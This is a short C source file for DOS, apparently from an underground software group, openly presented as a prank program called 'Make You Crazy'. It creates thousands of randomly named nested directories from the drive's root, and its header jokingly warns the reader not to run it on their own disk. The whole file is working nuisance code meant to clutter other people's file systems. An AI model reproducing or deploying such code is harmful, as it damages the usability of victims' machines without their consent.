/* Make You Crazy !!

	Never execute this program on your HD , haha !!



	Programmed By Ninja Wala -- Royal Leader of Software Underground Palace

	Share your knowledge and experience with other members in SUP,
	and we share ours with you.

*/

#include        <stdio.h>
#include		<stdlib.h>
#include        <dir.h>

main()
{
	int i,j;
	char tmp[20];
	char far *ptr;

	for (i=0;i<=50;i++){
		srand(rand());
		ptr = itoa(rand(),tmp,10);
		mkdir ( ptr );
		chdir ( ptr );
		for (j=0;j<=50;j++){
			ptr = itoa(rand(),tmp,10);
			mkdir( ptr );
		}
		chdir ("\\");
	}
}
